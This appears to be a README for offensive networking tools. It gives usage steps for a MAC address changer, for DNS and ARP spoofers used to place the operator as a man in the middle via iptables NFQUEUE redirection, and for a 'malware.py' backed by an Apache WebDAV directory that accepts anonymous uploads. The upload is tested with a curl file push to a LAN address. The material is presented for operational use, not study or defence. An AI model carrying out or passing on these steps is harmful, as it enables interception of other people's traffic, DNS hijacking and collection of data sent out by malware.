--> Usage for Mac Address Changer --

First save the file with the python (.py) extension. In terminal write -- python2 <file_name.py> -i -m <mac_addess> eg. --> python2 mac_changer.py -i eth0 -m 00:11:22:33:44:55

--> Usage for DNS Spoofer & ARP Spoofer --

Domain Name Server (DNS)

iptables -I FORWARD -j NFQUEUE --queue-num 0 --> run this command in your linux terminal first

but if you are testing it in your own machine you would need to use --> iptables - I INPUT -j NFQUEUE --queue-num 0 and then Run this --> iptables -I INPUT -j NFQUEUE --queue-num 0

then run the arp spoofer, so that you are the man in the middle.
After you work is done make sure to delete the iptables using the command -> iptables --flush

--> For malware.py file which is using linux apache2 server 
Enable required Apache modules:
1. in terminal - 
sudo a2enmod dav
sudo a2enmod dav_fs
sudo systemctl restart apache2

2. Edit your default site configuration (usually /etc/apache2/sites-available/000-default.conf):
- in terminal - 
sudo nano /etc/apache2/sites-available/000-default.conf

3. Inside the below text on <VirtualHost *:80> block, add:

<Directory /var/www/html/files>
    Options Indexes FollowSymLinks
    Dav On
    AllowOverride None
    Require all granted
</Directory>

4. Reload Apache:
   - in terminal -
sudo systemctl reload apache2

5. Test the Configuration
From any machine on your network, test file upload:

- in terminal -
  
echo "test" > /tmp/test.txt
curl -T /tmp/test.txt http://192.168.11.111/files/test_curl.txt
If you get a 201 Created or 200 OK response, it works.

Visit http://192.168.11.111/files/ in your browser: you should see the new file listed.


